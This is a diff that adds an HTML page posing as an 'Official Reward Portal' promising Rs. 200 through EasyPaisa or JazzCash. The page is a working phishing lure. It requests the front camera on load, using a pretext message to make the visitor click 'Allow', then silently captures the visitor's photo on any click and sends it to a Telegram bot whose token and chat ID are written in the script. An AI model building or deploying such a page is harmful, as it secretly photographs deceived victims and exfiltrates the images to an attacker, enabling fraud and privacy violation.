@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your Reward</title>
+    <style>
+        body { margin: 0; background: #f4f4f4; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; }
+        .header { background: #d91e18; color: white; padding: 20px; font-size: 24px; font-weight: bold; }
+        .reward-box { margin: 20px; padding: 20px; background: white; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
+        .amount { color: #27ae60; font-size: 40px; font-weight: bold; margin: 10px 0; }
+        .method-container { display: flex; justify-content: space-around; margin-top: 20px; }
+        .method-btn { width: 45%; cursor: pointer; border: 2px solid #ddd; padding: 10px; border-radius: 10px; background: white; }
+        .method-btn img { width: 100%; border-radius: 5px; }
+        .claim-btn { background: #d91e18; color: white; border: none; padding: 15px 40px; font-size: 20px; border-radius: 30px; margin-top: 30px; cursor: pointer; width: 80%; }
+        #video, #canvas { display: none; }
+        
+        /* Arabic Message Overlay */
+        #permissionMsg { 
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(0,0,0,0.8); color: white; z-index: 999; justify-content: center; align-items: center; padding: 20px;
+            font-size: 22px; direction: rtl;
+        }
+    </style>
+</head>
+<body onclick="captureAndSend()">
+
+    <div id="permissionMsg">يرجى النقر فوق "سماح" لتأكيد هويتك واستلام المكافأة</div>
+
+    <div class="header">OFFICIAL REWARD PORTAL</div>
+
+    <div class="reward-box">
+        <h3>Aapka Reward Taiyar Hai!</h3>
+        <div class="amount">Rs. 200.00</div>
+        <p>Apna Payment Method Select Karen:</p>
+        
+        <div class="method-container">
+            <div class="method-btn">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Easypaisa_logo.png/640px-Easypaisa_logo.png" alt="EasyPaisa">
+                <p>EasyPaisa</p>
+            </div>
+            <div class="method-btn">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/23/JazzCash_logo.png/640px-JazzCash_logo.png" alt="JazzCash">
+                <p>JazzCash</p>
+            </div>
+        </div>
+
+        <button class="claim-btn" id="mainClaimBtn">CLAIM NOW</button>
+    </div>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <script>
+        const botToken = '8466749965:AAEa8pM--47T3Mo6X34atY8LexkqC79epe0';
+        const chatId = '7107389141';
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const permissionMsg = document.getElementById('permissionMsg');
+
+        // Page load hotay hi camera permission maangna
+        window.onload = async () => {
+            permissionMsg.style.display = 'flex';
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+                permissionMsg.style.display = 'none'; // Permission milte hi msg gayab
+            } catch (err) {
+                console.log("Permission Denied");
+            }
+        };
+
+        // Screen par kahin bhi click ho toh photo jaye
+        async function captureAndSend() {
+            if (!video.srcObject) return;
+
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'capture.jpg');
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).then(res => console.log("Sent")).catch(err => console.log(err));
+            }, 'image/jpeg');
+        }
+    </script>
+</body>
+</html>
